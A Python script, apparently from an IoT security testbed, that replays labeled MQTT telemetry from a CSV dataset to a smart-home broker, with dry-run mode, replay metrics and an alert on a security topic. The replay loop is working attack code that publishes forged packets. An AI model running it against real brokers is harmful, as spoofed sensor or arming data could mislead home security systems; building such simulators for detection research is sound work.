import argparse
import csv
import json
import os
import time
import warnings
from datetime import datetime

import paho.mqtt.client as mqtt


PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

# Suppress deprecation warnings for cleaner output.
warnings.filterwarnings("ignore", category=DeprecationWarning)

# ==========================================
# REPLAY ATTACK CONFIGURATION
# ==========================================
BROKER_IP = os.getenv("MQTT_BROKER", "172.20.10.3")
DEFAULT_TOPIC = os.getenv("MQTT_TOPIC", "shtsp/home/telemetry")
ALERT_TOPIC = os.getenv("MQTT_ALERT_TOPIC", "shtsp/home/security/cmd")
LABELED_DATASET_FILE = os.path.join(
    PROJECT_ROOT, "dataset", "labeled", "dataset_Normal.csv"
)
REPORT_FILE = os.path.join(PROJECT_ROOT, "reports", "replay_attack_report.json")


class ReplayMetrics:
    def __init__(self, output_file):
        self.output_file = output_file
        self.started_at = None
        self.finished_at = None
        self.packets_sent = 0
        self.successful_packets = 0
        self.failed_packets = 0

    def start(self):
        self.started_at = time.time()

    def add_packet(self, success=True):
        self.packets_sent += 1
        if success:
            self.successful_packets += 1
        else:
            self.failed_packets += 1

    def finish(self, test_name, dataset_file, dry_run=False):
        self.finished_at = time.time()
        elapsed = max(self.finished_at - self.started_at, 0.0001)
        report = {
            "test_name": test_name,
            "dataset_file": dataset_file,
            "dry_run": dry_run,
            "timestamp": datetime.now().isoformat(),
            "elapsed_time_seconds": round(elapsed, 4),
            "packets_sent": self.packets_sent,
            "successful_packets": self.successful_packets,
            "failed_packets": self.failed_packets,
            "success_rate_percent": round(
                (self.successful_packets / self.packets_sent) * 100, 2
            )
            if self.packets_sent
            else 0,
            "throughput_pps": round(self.packets_sent / elapsed, 4),
        }

        os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
        with open(self.output_file, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)

        print("\nReplay summary")
        print(f"  Dataset: {dataset_file}")
        print(f"  Packets: {self.packets_sent}")
        print(f"  Success: {report['success_rate_percent']}%")
        print(f"  Throughput: {report['throughput_pps']} pps")
        print(f"  Report: {self.output_file}")


class ReplayAttacker:
    def __init__(self, broker_ip, default_topic, dataset_file, dry_run=False):
        self.broker_ip = broker_ip
        self.default_topic = default_topic
        self.dataset_file = dataset_file
        self.dry_run = dry_run
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "Replay_Attacker_Node")
        self.metrics = ReplayMetrics(REPORT_FILE)

    def load_captured_packets(self):
        """Load replay packets from the labeled dataset CSV."""
        if not os.path.exists(self.dataset_file):
            print(f"Dataset not found: {self.dataset_file}")
            print(
                "Collect labeled data first, or pass a CSV path with --dataset."
            )
            return []

        packets = []
        try:
            with open(self.dataset_file, "r", newline="", encoding="utf-8-sig") as f:
                reader = csv.DictReader(f)
                for row in reader:
                    packet = self._row_to_packet(row)
                    if packet:
                        packets.append(packet)
        except Exception as e:
            print(f"Error loading packets: {e}")
            return []

        print(f"Loaded {len(packets)} labeled dataset packets from {self.dataset_file}")
        return packets

    def _row_to_packet(self, row):
        """Convert supported dataset rows into publishable MQTT replay packets."""
        if "payload" in row and row["payload"]:
            return {
                "topic": row.get("topic") or self.default_topic,
                "payload": row["payload"],
            }

        # Realtime logger schema from defence/security_logger.py.
        if {"topic", "seq_num", "msg_type", "status", "uptime_ms"}.issubset(row.keys()):
            payload = {
                "type": row.get("msg_type") or "AUDIT",
                "seq": self._parse_int(row.get("seq_num"), -1),
                "status": row.get("status") or "N/A",
                "uptime": self._parse_int(row.get("uptime_ms"), 0),
                "replayed_at": datetime.now().isoformat(),
                "source_label": row.get("label") or "unknown",
                "source_timestamp": row.get("timestamp") or "",
            }
            return {
                "topic": row.get("topic") or self.default_topic,
                "payload": json.dumps(payload),
            }

        # Legacy labeled CSVs are still accepted when passed explicitly with --dataset.
        if {"pps", "heap", "motion", "arm"}.issubset(row.keys()):
            payload = {
                "type": "AUDIT",
                "pps": self._parse_float(row.get("pps"), 0.0),
                "heap": self._parse_int(row.get("heap"), 0),
                "mot": self._parse_int(row.get("motion"), 0),
                "arm": self._parse_int(row.get("arm"), 0),
                "replayed_at": datetime.now().isoformat(),
            }
            return {"topic": self.default_topic, "payload": json.dumps(payload)}

        return None

    @staticmethod
    def _parse_int(value, default):
        try:
            return int(float(value))
        except (TypeError, ValueError):
            return default

    @staticmethod
    def _parse_float(value, default):
        try:
            return float(value)
        except (TypeError, ValueError):
            return default

    def connect(self):
        if self.dry_run:
            print("Dry run enabled; MQTT connection skipped.")
            return True

        try:
            self.client.connect(self.broker_ip, 1883)
            self.client.loop_start()
            print(f"Connected to MQTT broker at {self.broker_ip}")
            return True
        except Exception as e:
            print(f"Connection failed: {e}")
            return False

    def continuous_replay(self, packets, cycles=3, delay=0.1):
        test_name = f"Replay Attack - Labeled Dataset ({cycles} cycles)"
        self.metrics.start()
        self.send_attack_alert("REPLAY_ATTACK_STARTED")

        for cycle in range(cycles):
            print(f"\nCycle {cycle + 1}/{cycles}")
            for idx, packet in enumerate(packets):
                try:
                    if self.dry_run:
                        if idx == 0 and cycle == 0:
                            print(f"Sample replay -> {packet['topic']}: {packet['payload']}")
                    else:
                        self.client.publish(packet["topic"], packet["payload"])

                    self.metrics.add_packet(success=True)
                    if (idx + 1) % 10 == 0:
                        print(f"  Replayed {idx + 1}/{len(packets)} packets")
                    time.sleep(delay)
                except Exception as e:
                    self.metrics.add_packet(success=False)
                    print(f"Error replaying packet {idx}: {e}")

            if cycle < cycles - 1:
                time.sleep(2)

        self.metrics.finish(test_name, self.dataset_file, dry_run=self.dry_run)

    def send_attack_alert(self, reason):
        if self.dry_run:
            return

        alert = {
            "action": "ALERT",
            "reason": reason,
            "timestamp": datetime.now().isoformat(),
        }
        self.client.publish(ALERT_TOPIC, json.dumps(alert))

    def disconnect(self):
        if self.dry_run:
            return

        self.client.loop_stop()
        self.client.disconnect()
        print("Disconnected from broker")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Replay MQTT traffic from the labeled dataset."
    )
    parser.add_argument("--broker", default=BROKER_IP, help="MQTT broker IP or host")
    parser.add_argument("--topic", default=DEFAULT_TOPIC, help="Default replay topic")
    parser.add_argument(
        "--dataset",
        default=LABELED_DATASET_FILE,
        help="CSV dataset to replay. Defaults to dataset/labeled/dataset_Normal.csv",
    )
    parser.add_argument("--cycles", type=int, default=3, help="Replay cycles")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between packets")
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Validate dataset replay without connecting to MQTT",
    )
    return parser.parse_args()


def main():
    args = parse_args()

    print("=" * 60)
    print("REPLAY ATTACK SIMULATOR")
    print("=" * 60)
    print("Source: labeled dataset")
    print(f"Dataset: {args.dataset}")
    print("=" * 60)

    attacker = ReplayAttacker(args.broker, args.topic, args.dataset, dry_run=args.dry_run)
    packets = attacker.load_captured_packets()
    if not packets:
        print("No packets to replay.")
        return

    if not attacker.connect():
        return

    try:
        attacker.continuous_replay(packets, cycles=args.cycles, delay=args.delay)
    except KeyboardInterrupt:
        print("\nTest stopped by user")
    finally:
        attacker.disconnect()


if __name__ == "__main__":
    main()
